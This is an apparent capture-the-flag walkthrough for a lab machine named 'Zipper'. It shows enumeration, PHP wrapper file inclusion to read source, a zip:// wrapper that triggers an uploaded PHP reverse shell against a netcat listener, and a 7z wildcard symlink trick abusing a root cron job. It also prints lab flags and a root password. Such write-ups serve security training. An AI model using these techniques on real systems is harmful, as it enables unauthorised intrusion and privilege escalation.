# Zipper

## Enumerating Services

First, we perform a generic check to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.193.229

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 80

Navigating to the target's port 80, we find the Zipper application that compresses a file sent to the site and makes it available for download. The page uses PHP.

Feroxbuster enumeration found the `uploads` folder.

```shell
# Enum Directories
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 5 -x php,asp,aspx,html,js,jsp,txt,pdf -C 404,502 -u http://192.168.193.229
```

Since this is PHP, we use the PHP filter wrapper to read the page source code.

```shell
# PHP Wrapper
http://192.168.193.229/index.php?file=php://filter/convert.base64-encode/resource=index

echo "PD9waHAKJGZpbGUgPSAkX0dFVFsnZmlsZSddOwppZihpc3NldCgkZmlsZSkpCnsKICAgIGluY2x1ZGUoIiRmaWxlIi4iLnBocCIpOwp9CmVsc2UKewppbmNsdWRlKCJob21lLnBocCIpOwp9Cj8+Cg==" | base64 -d

<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>
```

## Initial Access

The application adds the `.php` extension to the file entered by the user. We load a PHP webshell into the target and then decompress it using the `zip://` wrapper.

```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Unzip with ZIP Wrapper
http://192.168.193.229/index.php?file=zip://uploads/upload_1712710203.zip%23php-reverse-shell

# TTY Upgrade
/usr/bin/python3.8 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /var/www/local.txt
e8a5f656f7c26af91464c1715cfddfdd
```

## Privilege Escalation

Enumerating the target's directories, we find a script in the `/opt` folder. The code uses `7z` to compress all files in the web application's `uploads` folder, running as root.

We exploit this via the 7z wildcard trick from HackTricks: create a `test.zip` file which is a symlink to the secret file, and a `@test.zip` file which tells 7z to treat `test.zip` as a list of files. When the task executes, 7z will treat the symlink as a file list, causing an error that dumps the contents of the secret file into the log.

```shell
# link usage
ln --help
Usage: ln [OPTION]... [-T] TARGET LINK_NAME

# Path of the compress action
cd /var/www/html/uploads/

# Creating the file which is a symbolic link that points to /root/secret
ln -s /root/secret test.zip

# Tell 7z that test.zip is a list file
touch @test.zip

# Reading backup.log (after cron executes)
cat /opt/backups/backup.log
/root/secret : WildCardsGoingWild
```

## Post-Exploitation

With root's credentials, we log into his account and capture the proof.txt flag.

```shell
# Change to root
su root # WildCardsGoingWild

# Evidence
ip a

# proof.txt
cat /root/proof.txt
3e434a1b34917eba34422cfe736068cb
```
